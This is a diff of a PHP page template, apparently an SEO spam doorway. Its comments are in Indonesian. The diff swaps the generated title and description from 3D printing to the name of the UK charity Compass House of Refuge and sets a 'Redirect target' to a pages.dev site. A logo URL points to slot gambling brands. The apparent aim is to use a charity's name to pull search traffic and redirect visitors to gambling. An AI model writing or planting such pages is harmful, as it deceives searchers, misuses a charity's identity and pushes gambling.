@@ -62,14 +62,14 @@
         $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
         // SEO DATA (AUTO GENERATE)
-        $title = "$BRAND : Mengenal Teknologi 3D Printing dan Additive Manufacturing";
+        $title = "$BRAND : Compass House of Refuge Dukungan Keluarga dan Pendidikan";
 
-        $description = "$BRAND menjadi istilah yang erat dengan perkembangan teknologi manufaktur digital, prototyping, desain produk, dan additive manufacturing. Teknologi 3D printing memungkinkan sebuah objek tiga dimensi dibuat berdasarkan data digital dengan menambahkan material secara bertahap hingga membentuk produk sesuai rancangan.";
+        $description = "$BRAND Compass House of Refuge membahas dukungan keluarga pendidikan dan pengembangan komunitas di Southend-on-Sea Essex untuk membantu menciptakan peluang yang lebih baik.";
         
-        $artikel = "menjadi istilah yang erat dengan perkembangan teknologi manufaktur digital, prototyping, desain produk, dan additive manufacturing. Teknologi 3D printing memungkinkan sebuah objek tiga dimensi dibuat berdasarkan data digital dengan menambahkan material secara bertahap hingga membentuk produk sesuai rancangan.";
+        $artikel = "Compass House of Refuge membahas dukungan keluarga pendidikan dan pengembangan komunitas di Southend-on-Sea Essex untuk membantu menciptakan peluang yang lebih baik.";
 
         // Bisa diganti random image atau CDN sendiri
-        $image = "https://i.pinimg.com/1200x/90/54/c9/9054c978f92f14c76decea65cd580951.jpg";  
+        $image = "https://i.pinimg.com/1200x/0a/45/ac/0a45ac5cff4b5ac6110c8fa9726393be.jpg";  
 
         // Canonical URL
         $canonical = $current_url;
@@ -79,7 +79,7 @@
     }
 
     // Redirect target
-    $ampmek = "https://3d-print-lab.pages.dev/?id=$BRAND";
+    $ampmek = "https://compasshouseofrefuge.pages.dev/?id=$BRAND";
     $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
     $favicon = "https://www.gstatic.com/search-console/scfe/favicon.png";
     ?>
